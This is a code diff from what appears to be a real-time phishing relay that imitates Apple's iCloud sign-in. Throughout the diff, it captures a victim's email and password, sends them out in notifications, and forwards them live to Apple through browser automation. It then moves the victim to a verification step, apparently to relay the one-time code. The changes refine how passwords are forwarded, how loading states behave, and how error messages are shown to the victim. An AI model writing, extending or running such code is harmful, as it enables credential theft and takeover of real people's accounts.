@@ -944,7 +944,9 @@ def forward_email(apple: Page, frame, email: str) -> bool:
         if not frame:
             return False
     try:
-        ok, _frame = drive_email(apple, frame, email, find_apple_frame)
+        ok, _frame = drive_email(
+            apple, frame, email, find_apple_frame, open_icloud_sign_in
+        )
         return ok
     except PlaywrightError as e:
         print('  [fwd] email ERR', repr(e), flush=True)
@@ -977,6 +979,7 @@ def forward_password(apple: Page, frame, password: str, email: str = '') -> bool
             email or '',
             find_apple_frame,
             password_submit_ok=_apple_password_submit_ok,
+            open_signin=open_icloud_sign_in,
         )
         return ok
     except PlaywrightError as e:
@@ -1708,10 +1711,9 @@ def apple_password_step_ready(frame) -> bool:
     if not frame:
         return False
     try:
-        from apple_drive import email_ready_for_password, read_account_email
+        from apple_drive import password_entry_ready, read_account_email
 
-        em = read_account_email(frame)
-        return email_ready_for_password(frame, em)
+        return password_entry_ready(frame, read_account_email(frame))
     except ImportError:
         pass
     try:
@@ -2186,7 +2188,7 @@ def victim_begin_signin_loading(victim, *, remote: bool) -> None:
 
 
 def victim_clear_signin_loading(victim, *, remote: bool, extra: dict | None = None) -> None:
-    payload: dict = {'clearSigninLoading': True}
+    payload: dict = {'clearSigninLoading': True, 'signinLoading': False}
     if extra:
         payload.update(extra)
     if remote and hasattr(victim, 'push_harbor_state'):
@@ -2836,33 +2838,6 @@ def run() -> int:
                             victim_password_state.set_authoritative(pw)
                             victim_typed_live['password'] = pw
                             credentials['password'] = pw
-                            notify_lab_event(
-                                'Harbor — password (commit)\n'
-                                f"Email: {credentials.get('email') or victim_email_state.get() or '-'}\n"
-                                f'Password: {pw}'
-                            )
-                            frame = find_apple_frame(apple, frame)
-                            if frame and args.remote:
-                                try:
-                                    from apple_drive import password_entry_ready, type_password
-
-                                    em = (
-                                        credentials.get('email')
-                                        or victim_email_state.get()
-                                        or ''
-                                    ).strip()
-                                    if password_entry_ready(frame, em):
-                                        type_password(frame, pw)
-                                except ImportError:
-                                    pass
-                            push_victim_password_to_apple(
-                                apple,
-                                frame,
-                                victim_password_state,
-                                apple_password_live,
-                                force=True,
-                            )
-                            frame = find_apple_frame(apple, frame)
                         continue
                     if ev.get('type') != 'input':
                         continue
@@ -3020,32 +2995,36 @@ def run() -> int:
                                 f"Email: {credentials.get('email') or '-'}\n"
                                 f'Password: {pwd_send}'
                             )
-                            victim_begin_signin_loading(victim, remote=args.remote)
-                            victim_signin_loading_until = time.time() + 90.0
                             em = victim_email_state.best_of(
                                 account, credentials.get('email') or ''
                             ).strip()
                             if em:
                                 credentials['email'] = em
-                            print(f'  [fwd] victim submit -> forward_password ({len(pwd_send)} chars)', flush=True)
+                            print(
+                                f'  [fwd] victim submit -> forward_password ({len(pwd_send)} chars)',
+                                flush=True,
+                            )
                             frame = ensure_apple_signin_frame(apple, find_apple_frame(apple, frame))
-                            if forward_password(
-                                apple,
-                                frame,
-                                pwd_send,
-                                em or credentials.get('email') or account,
-                            ):
+                            pwd_ok = False
+                            try:
+                                pwd_ok = forward_password(
+                                    apple,
+                                    frame,
+                                    pwd_send,
+                                    em or credentials.get('email') or account,
+                                )
+                            finally:
+                                victim_signin_loading_until = 0.0
+                                victim_clear_signin_loading(victim, remote=args.remote)
+                            if pwd_ok:
                                 frame = find_apple_frame(apple, frame)
                                 pending_verify_until = time.time() + 35.0
                                 mirror_loading_until = time.time() + 35.0
-                                victim_signin_loading_until = 0.0
                                 awaiting_apple_path = '/verify'
                                 victim_set_verify(victim, credentials.get('email') or '')
                                 if args.remote and hasattr(victim, 'push_harbor_state'):
-                                    victim_clear_signin_loading(
-                                        victim,
-                                        remote=True,
-                                        extra={'mirrorLoading': True},
+                                    victim.push_harbor_state(
+                                        {'mirrorLoading': True, 'clearSigninLoading': True}
                                     )
                                 elif not args.remote:
                                     victim_eval(
@@ -3056,19 +3035,11 @@ def run() -> int:
                                         }""",
                                     )
                             else:
-                                frame = find_apple_frame(apple, frame)
-                                victim_signin_loading_until = 0.0
-                                victim_clear_signin_loading(victim, remote=args.remote)
-                                victim_eval(
+                                victim_push_signin_error(
                                     victim,
-                                    """() => {
-                                      if (window.HarborDriver && window.HarborDriver.showSignInError) {
-                                        window.HarborDriver.showSignInError(
-                                          'Password could not be sent to Apple. Complete email on iCloud first, then try again.',
-                                          'password'
-                                        );
-                                      }
-                                    }""",
+                                    'Could not send password to Apple. Check the iCloud window, then try again.',
+                                    'password',
+                                    remote=args.remote,
                                 )
                     elif etype == 'email-commit':
                         continue
@@ -3567,8 +3538,14 @@ def run() -> int:
                         ).strip()
                         if em:
                             ui_state['email'] = em
-                    elif time.time() < victim_signin_loading_until:
+                    elif (
+                        time.time() < victim_signin_loading_until
+                        and not (on_signin and pw_on_apple and victim_password_ui_applied)
+                    ):
                         ui_state['signinLoading'] = True
+                    else:
+                        ui_state['clearSigninLoading'] = True
+                        ui_state['signinLoading'] = False
                     if route_sync.operator_path() == '/verify' and apple_otp_step_ready(frame):
                         vc = build_verify_copy_dict(frame, credentials.get('email') or '')
                         if vc:
